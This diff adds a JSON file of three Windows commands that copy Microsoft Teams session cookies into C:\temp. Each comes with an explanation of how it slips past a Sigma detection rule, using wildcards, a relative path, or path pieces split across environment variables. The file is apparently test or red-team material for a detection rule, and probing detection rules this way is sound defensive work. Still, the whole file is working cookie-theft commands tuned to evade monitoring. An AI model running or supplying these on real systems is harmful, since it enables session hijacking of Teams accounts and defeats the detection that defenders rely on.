@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"Copy-Item -Path $env:APPDATA\\Microsoft\\Te*ms\\C*kies -Destination C:\\temp\\ -Recurse\"",
+    "explanation": "This PowerShell command bypasses the Sigma rule by using wildcards ('Te*ms' and 'C*kies'). The rule relies on exact string matching for '\\Microsoft\\Teams\\Cookies', which is evaded here because the exact string is never explicitly typed in the command line."
+  },
+  {
+    "output": "cmd.exe /c \"cd %APPDATA%\\Microsoft\\Teams && copy Cookies\\* C:\\temp\\\"",
+    "explanation": "This command bypasses the rule by utilizing relative paths. By first changing the working directory to the Teams folder, the subsequent copy operation only needs to reference 'Cookies\\*'. The continuous string '\\Microsoft\\Teams\\Cookies' evaluated by the rule's selection criteria is not present."
+  },
+  {
+    "output": "cmd.exe /c \"set A=\\Microsoft\\Teams& set B=\\Cookies& call xcopy %APPDATA%%A%%B% C:\\temp\\ /E\"",
+    "explanation": "This command uses environment variable obfuscation and concatenation. The path is broken into smaller chunks ('\\Microsoft\\Teams' and '\\Cookies') and reassigned to variables. When evaluated by static command line logging, the full target string is split, evading the 'contains' condition."
+  }
+]
